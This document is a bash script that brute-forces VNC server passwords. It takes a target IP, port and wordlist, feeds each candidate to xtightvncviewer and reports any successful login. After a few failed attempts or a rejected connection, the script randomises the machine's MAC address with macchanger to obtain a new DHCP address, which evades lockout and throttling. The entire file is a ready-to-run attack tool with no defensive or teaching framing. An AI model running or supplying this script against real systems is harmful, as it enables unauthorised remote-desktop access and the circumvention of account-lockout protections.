#!/bin/bash
read -p "IP4 Address: " ipadd
read -p "Access Port (default:5900): " port
read -p "Password File Name: " file_name
interface=$(ls /sys/class/net | grep -v "lo")
#interface=$(ip a | awk '/inet.*brd/{print $NF}')
connection=0
echo
echo -e "\033[34mTrying...\033[0m"
echo 
xtightvncviewer $ipadd:$port > stdout.txt 2>&1 &
established=0
count=0
sleep 1
netstat -na | grep 5900
while [ $established -eq 0 ]; 
do	#netstat error, showing TIME_WAIT
	if netstat -na | grep 5900 | grep "ESTABLISHED" 
	then
		pkill -f "xtightvncviewer"
		established=1
	elif grep -q "No route to host" stdout.txt
	then
		pkill -f "xtightvncviewer"
		established=-1
	elif grep -q "Connection refused" stdout.txt
	then
		pkill -f "xtightvncviewer"
		established=-1
	else
		count=$((count+1))
		sleep 0.1
	fi
	if [ $count -eq 100 ]; then
		established=-1
		pkill -f "xtightvncviewer"
	fi
done
sleep 0.1
	if [[ $established -eq 1 ]]
        then
		echo -e "\033[32m[Established Connection]\033[0m"
		echo
		connection=1
        else
                echo -e "\033[31mUnable to connect\033[0m"
        fi
dhcp_hop(){ # change mac, get new dhcp lease
	echo "Changing IP..."
        prev_ip=$(hostname -I)
        ifconfig "$interface" down
        sudo macchanger "$interface" -r > /dev/null
        ifconfig "$interface" up
        new=0
        while [ $new -eq 0 ];
        do
                if [[ "$(hostname -I)" == "$prev_ip" ]]
                then
			sleep 0.1 
                else
                        new=1
                fi
        done
	echo "New: $(hostname -I)"
	echo
}

if [[ connection -eq 1 ]]
then
	tries=1
	pws=0
	match=0
	while read -r line; do
		pws=$((pws+1))
		echo "Trying: ${line}"
		xtightvncviewer -passwd <(vncpasswd -f <<<"$line") $ipadd:$port > stdout.txt 2>&1 &
		sleep 1 # avoid throttling
		tries=$((tries+1))
		if grep -q "Authentication successful" stdout.txt
		then
			echo "[MATCH FOUND!]: ${line}"
			echo
			match=1
			pkill -f "xtightvncviewer"
			break
		elif grep -q "Authentication failed" stdout.txt
		then
			pkill -f "xtightvncviewer"
			echo "[STATUS]: Failed"
			echo
			if [[ $tries -eq 3 ]]
			then
				dhcp_hop
				tries=0
			fi
		elif grep -q "connection has been rejected" stdout.txt
		then
			echo "[Status]: Failed"
			dhcp_hop
			tries=0
			pkill -f "xtightvncviewer"
		else
			echo "No response"
			pkill -f "xtightvncviewer"
		fi
	done < "$file_name"

	if  [ "$match" -eq 0 ]
	then
	echo "${pws} Passwords tried, 0 matches found."
	elif [ "$match" -eq 1 ] 
	then
		echo "${pws} Passwords tried, 1 match found."
	fi 
fi
